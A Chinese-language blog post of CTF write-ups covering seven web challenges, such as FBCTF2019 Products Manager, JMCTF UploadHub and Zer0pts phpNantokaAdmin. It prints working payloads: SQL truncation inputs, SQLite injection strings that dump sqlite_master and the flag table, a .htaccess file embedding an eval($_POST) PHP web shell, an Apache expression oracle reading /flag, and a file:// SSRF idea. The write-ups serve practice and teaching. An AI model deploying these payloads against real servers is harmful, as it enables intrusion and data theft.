> 又是早起刷题的一天

## 0x01 [FBCTF2019]Products Manager

- sql约束注入

  在插入数据的时候，如果字段设置了应该插入的字符串长度，那么在添加的时候，如果有超过该长度的，就会被截断

- mysql字符串比较

  `mysql` == `mysql空格空格空格空格空格空格空格空格空格空格                  

![image-20220105080355847](https://img.dem0dem0.top/images/image-20220105080355847.png)

可以看到sql的每个字段都进行了长度限制，并且在最后的位置并没有进行代码上的处理而是直接插入。所以，我们就可以开始操作了。

插入

```
name: facebook                                    11
scert: 123456qwert
des: dviurbwgpbwf
```

然后查询

```
name: facebook
scert: 123456qwert
```

## 0x02[BSidesCF 2019]Sequel

sqlite注入，难度还行，like模糊匹配就可以了。

## 0x03 [b01lers2020]Space Noodles

https://tyaoo.github.io/2020/05/26/BUUCTF-2/

完全没懂这个题目是什么意思，好想类似于之前做的那种签到有趣题，就是猜，到底用哪种请求方法去访问接口，正确了就给你返回。

> 开头先列一下 HTTP 的请求方法，下面会用到

| 序号 | 方法    | 描述                                                         |
| :--- | :------ | :----------------------------------------------------------- |
| 1    | GET     | 请求指定的页面信息，并返回实体主体。                         |
| 2    | HEAD    | 类似于 GET 请求，只不过返回的响应中没有具体的内容，用于获取报头 |
| 3    | POST    | 向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST 请求可能会导致新的资源的建立和/或已有资源的修改。 |
| 4    | PUT     | 从客户端向服务器传送的数据取代指定的文档的内容。             |
| 5    | DELETE  | 请求服务器删除指定的页面。                                   |
| 6    | CONNECT | HTTP/1.1 协议中预留给能够将连接改为管道方式的代理服务器。    |
| 7    | OPTIONS | 允许客户端查看服务器的性能。                                 |
| 8    | TRACE   | 回显服务器收到的请求，主要用于测试或诊断。                   |
| 9    | PATCH   | 是对 PUT 方法的补充，用来对已知资源进行局部更新 。           |

## 0x04 [极客大挑战 2020]Roamphp2-Myblog

```
assets/img/upload/deb4b643fea6111d2d8cac5475225e87210ca3b4.jpg
```

文件包含拿到源码，登录的时候他是和session存储的密码进行比对的，那么我们如果把session删除并且把password置为空，就可以登录成功了。

## 0x05 [JMCTF 2021]UploadHub

津门CTF题目的复现。

```
<FilesMatch .htaccess>
SetHandler application/x-httpd-php 
Require all granted  
php_flag engine on  
</FilesMatch>

php_value auto_prepend_file .htaccess
#<?php eval($_POST['dem0']);?>
```

这里面的一个点就是 dir标签要晚于file标签执行，所以利用优先级的差距。这个就被接出来了。

但是还是要点名表扬一下NU1L大哥，yyds!

```php
<If "file('/flag')=~ '/flag{/'">
ErrorDocument 404 "wupco"
</If>
```

也就是如果匹配到了，那么就设置404页面中存在wupco，就可以判断是否成功了。`~`表示开启正则匹配。

https://httpd.apache.org/docs/2.4/expr.html

https://httpd.apache.org/docs/2.4/mod/core.html#file

https://httpd.apache.org/docs/2.4/sections.html

## 0x06 [Zer0pts2020]phpNantokaAdmin

> 查看源码

```
$sql = "CREATE TABLE {$table_name} (";
$sql .= "dummy1 TEXT, dummy2 TEXT";
$sql .= ', ';
$sql .= "`$column` $type";
$sql .= ');';
create table {$table_name} (dummy1 TEXT, dummy2 TEXT, $column $type);
```

```
$pdo->query('CREATE TABLE `' . FLAG_TABLE . '` (`' . FLAG_COLUMN . '` TEXT);');
$pdo->query('INSERT INTO `' . FLAG_TABLE . '` VALUES ("' . FLAG . '");');
$pdo->query($sql);
```

![image-20220105102321175](https://img.dem0dem0.top/images/image-20220105102321175.png)

可以看到将列名在页面中显示出来了。所以我们可以考虑在这里进行注入。由于之前，已经做过相关的分析，[]可以用这个来进行注释。

`sqlite_master` yyds!

```
table_name=landv as select sql [&columns[0][name]=abc&columns[0][type]=] from sqlite_master;
```

```
table_name=landv as select flag_2a2d04c3 [&columns[0][name]=abc&columns[0][type]=] from flag_bf1811da;
```

这里两次拼接出来的语句是

```
create table landv as select sql [ (dummy1 TEXT, dummy2 TEXT, abc ] from sqlite_master;);
```

create table landv (a); 最后的语句就是这样，也就是在create中如何来

![image-20220105103011239](https://img.dem0dem0.top/images/image-20220105103011239.png)

## 0x07 [FireshellCTF2020]URL TO PDF

首先是一个输入url的输入框，www.baidu.com

yyds.发现就是渲染当前页面的。然后存储为pdf，然后就啥也不知道了。看看它是使用了什么爬虫引擎。

```
easyPrint 51 (http://weasyprint.org/)
```

这好想不是一个nodejs的库，所以不难直接xss来getshell，考虑一个ssrf单纯的利用。`file:///flag`

然后找所有可以接入到网站中的标签，查看wp发现了l`ink`标签可以。